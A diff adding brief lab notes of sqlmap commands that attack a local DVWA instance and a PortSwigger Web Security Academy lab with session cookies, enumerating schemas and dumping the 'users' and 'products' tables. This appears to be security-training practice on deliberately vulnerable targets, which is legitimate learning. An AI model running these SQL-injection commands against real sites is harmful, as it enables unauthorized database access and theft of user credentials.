@@ -1,0 +1,14 @@
+1. SQL test with DVWA
+sqlmap -u "http://192.168.56.104:82/vulnerabilities/sqli/?id=1234&Submit=Submit#" --cookie "PHPSESSID=kki3gafvv0is9l648akps607nh; security=low"
+sqlmap -u "http://192.168.56.104:82/vulnerabilities/sqli/?id=1234&Submit=Submit#" --cookie "PHPSESSID=kki3gafvv0is9l648akps607nh; security=low" --tables
+sqlmap -u "http://192.168.56.104:82/vulnerabilities/sqli/?id=1234&Submit=Submit#" --cookie "PHPSESSID=kki3gafvv0is9l648akps607nh; security=low" --schema --batch
+sqlmap -u "http://192.168.56.104:82/vulnerabilities/sqli/?id=1234&Submit=Submit#" --cookie "PHPSESSID=kki3gafvv0is9l648akps607nh; security=low" --column -T users --batch
+sqlmap -u "http://192.168.56.104:82/vulnerabilities/sqli/?id=1234&Submit=Submit#" --cookie "PHPSESSID=kki3gafvv0is9l648akps607nh; security=low" --dump -T users --batch
+
+sqlmap -u "http://192.168.56.104:82/vulnerabilities/sqli/?id=1234&Submit=Submit#" --wizard
+
+
+2. SQL test for https://portswigger.net/web-security/sql-injection/lab-login-bypass
+sqlmap -u "https://0a9f00f004727b0cc07c7a6700ec0095.web-security-academy.net/filter?category=Lifestyle" --cookie "session=v10ds1ie3fB3QwUwmfGdNHtzvNX9dkLp" --tables
+sqlmap -u "https://0a9f00f004727b0cc07c7a6700ec0095.web-security-academy.net/filter?category=Lifestyle" --cookie "session=v10ds1ie3fB3QwUwmfGdNHtzvNX9dkLp" --tables
+sqlmap -u "https://0a9f00f004727b0cc07c7a6700ec0095.web-security-academy.net/filter?category=Lifestyle" --cookie "session=v10ds1ie3fB3QwUwmfGdNHtzvNX9dkLp" --dump -T products
